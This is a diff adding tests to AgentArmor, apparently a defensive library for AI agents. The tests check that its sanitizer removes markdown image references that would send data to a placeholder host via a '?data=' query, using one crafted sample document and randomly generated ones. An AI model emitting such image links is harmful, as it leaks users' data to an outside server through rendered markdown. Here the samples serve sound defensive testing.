@@ -1,5 +1,6 @@
 import { createRequire } from 'node:module';
 import { describe, expect, it } from 'vitest';
+import { AgentArmor } from '../agent-armor';
 import { MarkdownReferenceExfiltrationDetector } from '../detectors/behavioural-control/markdown-reference-exfiltration';
 
 /**
@@ -64,6 +65,30 @@ function drawsExfilImage(doc: string, md: { parse(src: string, env: object): Arr
     tokens.some((t) => (t.type === 'image' && /[?&]data=Q/.test(t.attrGet('src') ?? '')) || (Array.isArray(t.children) && walk(t.children as typeof tokens)));
   return walk(md.parse(doc, {}));
 }
+
+describe('sanitized text against a real renderer (#226)', () => {
+  const armor = AgentArmor.regexOnly();
+  const marker = '[BLOCKED: exfiltration instruction removed by AgentArmor]';
+  it('a marker-labelled definition cannot turn the sanitized text back into an image', () => {
+    const doc = `!![a][r]\n\n[r]: https://e.x/p.png?data=Q\n${marker}: https://e.x/p.png?data=Q\n`;
+    expect(renderers.some((md) => drawsExfilImage(doc, md))).toBe(true);
+    const out = armor.scanSync(doc).sanitized;
+    expect(renderers.some((md) => drawsExfilImage(out, md))).toBe(false);
+  });
+  for (const seed of [1, 2]) {
+    it(`sanitized output draws no exfil image in generated documents (seed ${seed})`, () => {
+      const rand = rng(seed);
+      const left: string[] = [];
+      for (let n = 0; n < Number(process.env.ORACLE_CASES ?? 6000) / 2; n++) {
+        const doc = generate(rand);
+        if (!renderers.some((md) => drawsExfilImage(doc, md))) continue;
+        const out = armor.scanSync(doc).sanitized;
+        if (renderers.some((md) => drawsExfilImage(out, md))) left.push(doc);
+      }
+      expect(left.slice(0, 3).map((doc) => JSON.stringify(doc))).toEqual([]);
+    }, 120_000);
+  }
+});
 
 describe('against a real renderer (#225)', () => {
   const cases = Number(process.env.ORACLE_CASES ?? 6000);
